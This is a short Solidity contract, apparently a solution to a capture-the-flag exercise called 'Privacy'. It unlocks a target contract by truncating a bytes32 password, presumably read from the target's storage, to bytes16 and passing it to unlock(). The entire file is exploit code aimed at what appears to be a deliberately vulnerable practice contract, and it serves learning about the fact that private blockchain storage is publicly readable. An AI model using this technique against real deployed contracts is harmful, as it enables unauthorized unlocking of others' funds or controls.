// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Privacy.sol";

contract PrivacyAttack {

  Privacy privacyContract;

  constructor(address _privacyContractAddress) {
      privacyContract = Privacy(_privacyContractAddress);
  }

  function attack(bytes32 password) external {
      bytes16 rightPassword = bytes16(password);
      privacyContract.unlock(rightPassword);
  }
}